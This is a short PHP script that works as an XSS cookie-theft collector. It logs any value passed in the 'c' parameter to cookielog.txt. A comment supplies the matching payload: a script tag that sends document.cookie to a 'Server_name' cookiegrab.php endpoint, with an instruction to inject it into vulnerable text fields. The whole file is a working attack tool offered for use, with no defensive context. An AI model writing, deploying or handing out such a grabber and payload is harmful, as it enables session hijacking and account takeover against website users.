<?php

	$cookie = $_GET['c'];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
	/* 
	inject 
	<script> document.location= "http://Server_name/cookiegrab.php?c=" + document.cookie; </script>
	into vulnerable text fields
	*/
?> 